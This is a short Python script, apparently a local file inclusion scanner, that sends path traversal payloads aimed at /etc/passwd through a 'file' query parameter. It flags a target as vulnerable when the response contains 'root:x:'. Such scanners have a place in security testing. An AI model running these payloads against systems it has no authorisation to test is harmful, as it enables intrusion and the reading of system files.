import requests

payloads = [
    "../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd"
]

def lfi_scanner(target):
    for payload in payloads:
        try:
            response = requests.get(target, params={"file": payload}, timeout=5)
            if "root:x:" in response.text:
                return f"VULNERABLE: LFI with payload={payload}"
        except Exception as e:
            return f"Greška: {str(e)}"
    return "Clean"
